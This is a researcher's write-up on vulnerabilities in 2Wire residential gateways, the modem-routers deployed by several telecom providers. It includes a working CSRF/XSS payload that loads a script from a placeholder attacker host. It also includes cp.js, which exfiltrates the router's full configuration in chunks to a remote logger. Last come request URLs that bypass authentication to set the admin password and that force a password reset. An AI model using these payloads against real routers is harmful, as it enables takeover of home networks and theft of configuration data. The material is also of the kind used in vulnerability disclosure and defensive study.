### Current Research Focus
My current research is focused on vulnerabilities in residential routers, particularly 2Wire Residential Gateways.

## 2Wire Residential Gateways
2Wire Residential Gateways are broadband modem/router combinations that provide DSL connectivity, home networking, firewall protection, and remote management capabilities. The HomePortal series by 2Wire supports a range of broadband interfaces, including ADSL 2+, VDSL 1 and 2, FTTN (Fiber to the Node), and FTTP (Fiber to the Premises). These gateways are based on integrated system-on-a-chip architectures and support TR-069, HomePNA, MoCA, USB, 802.11b/g wireless standards, and web-based remote access.

### Global Usage
2Wire Residential Gateways are used by major telecommunications providers around the world, including:
- AT&T (United States)
- Bell (Canada)
- BT Group (United Kingdom)
- SingTel (Singapore)
- Telecom (New Zealand)
- PLDT (Philippines)
- Telmex (Mexico)

## Vulnerabilities in 2Wire Residential Gateways
The following vulnerabilities have been identified in 2Wire Residential Gateways:

1. **Cross Site Request Forgery (CSRF)**
2. **Authentication Bypass**
3. **Password Reset with WEP Key**
4. **CRLF Denial of Service (DoS)**
5. **DSL Denial of Service (DoS)**
6. **Cross Site Scripting (XSS)**
7. **Configuration Disclosure**

### The Web Interface
The web interface for 2Wire Residential Gateways is typically accessible via:
- **IP Address:** 192.168.1.254
- **Domain Name:** gateway.2wire.net

### Exploiting the Web Interface
#### Client-Side Exploits
To exploit the web interface, an attacker can use various methods to get a request from the client, such as:
- Visiting a malicious webpage
- Using HTML tags with `src` attributes
- Other HTML injection techniques

#### Example of CSRF Attack
```javascript
if (document.location.href.indexOf("gateway.2wire.net") > 0) {
    var iframe = unescape('%3Ciframe%20name%3Diframe%20style%3D%22visibility%3A%20hidden%3B%22%20width%3D2%20height%3D2%20src%3D%22http%3A//gateway.2wire.net/xslt%3FPAGE%3DH04%26THISPAGE%3D%3C/SCRIPT%3E%3D%3CSCRIPT%20SRC%3Dhttp%3A//xxxx/cp.js%3E%3C/SCRIPT%3E%22%3E%3C/iframe%3E');
} else {
    var iframe = unescape('%3Ciframe%20name%3Diframe%20style%3D%22visibility%3A%20hidden%3B%22%20width%3D2%20height%3D2%20src%3D%22http%3A//192.168.1.254/xslt%3FPAGE%3DH04%26THISPAGE%3D%3C/SCRIPT%3E%3D%3CSCRIPT%20SRC%3Dhttp%3A//xxxx/cp.js%3E%3C/SCRIPT%3E%22%3E%3C/iframe%3E');
}
document.write(iframe);
```

#### cp.js
This script remotely logs the complete configuration file.
```javascript
xmlhttp.open("GET", "/xslt?page=mgmt_data", false);
xmlhttp.send(null);
var doc = xmlhttp.responseText;
var h = parseInt(doc.length / 800) + 1;
var k = 0;
var m = 0;

function statement1() {
    var contenido = doc.substr(k, 800);
    k += 800;
    with (document) body.appendChild(createElement("script")).setAttribute("src", "http://xxxx/logger.php?file=" + contenido);
    m++;
    if (m > h) {
        clearInterval(tid);
    }
}

var tid = setInterval('statement1()', 1000);
```

### Authentication Bypass in Page CD35_SETUP_01
A recent discovery allows changing the password even if it is set. The following URL can be used to change the password to "admin":
```
/xslt?PAGE=CD35_SETUP_01_POST&password1=admin&password2=admin&HINT=admin
```

### Password Reset in CD35_SETUP_01
By sending a password with more than 512 characters, the password gets reset, and the next time you access the device, the H04 page will prompt for a new password.
```
/xslt?PAGE=CD35_SETUP_01_POST&password1=hkmhkmhkm...[long string]...&password2=hkmhkmhkm...[long string]...
```
